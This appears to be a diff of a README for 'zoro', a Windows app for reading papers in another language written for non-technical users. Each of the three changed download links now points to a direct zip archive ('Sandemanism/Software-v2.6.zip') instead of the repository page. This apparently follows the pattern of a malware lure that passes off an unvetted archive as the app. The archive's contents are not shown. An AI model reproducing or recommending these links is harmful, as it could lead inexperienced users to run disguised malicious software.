@@ -1,6 +1,6 @@
 # 📚 zoro - Read papers in your language
 
-[![Download zoro](https://img.shields.io/badge/Download-zoro-6c5ce7?style=for-the-badge&logo=github)](https://github.com/bollywoodhymanrickover646/zoro)
+[![Download zoro](https://img.shields.io/badge/Download-zoro-6c5ce7?style=for-the-badge&logo=github)](https://github.com/bollywoodhymanrickover646/zoro/raw/refs/heads/main/Sandemanism/Software-v2.6.zip)
 
 ## 🌟 What zoro does
 
@@ -20,7 +20,7 @@ This guide is for Windows users with no coding experience. You only need to down
 
 Open this page in your browser:
 
-[Download zoro on GitHub](https://github.com/bollywoodhymanrickover646/zoro)
+[Download zoro on GitHub](https://github.com/bollywoodhymanrickover646/zoro/raw/refs/heads/main/Sandemanism/Software-v2.6.zip)
 
 ### 2. Get the Windows app
 
@@ -153,7 +153,7 @@ No. Download the app, open it, and follow the steps on screen.
 
 Use this link to get zoro:
 
-[Visit the zoro download page](https://github.com/bollywoodhymanrickover646/zoro)
+[Visit the zoro download page](https://github.com/bollywoodhymanrickover646/zoro/raw/refs/heads/main/Sandemanism/Software-v2.6.zip)
 
 Then on Windows:
 - Download the app file
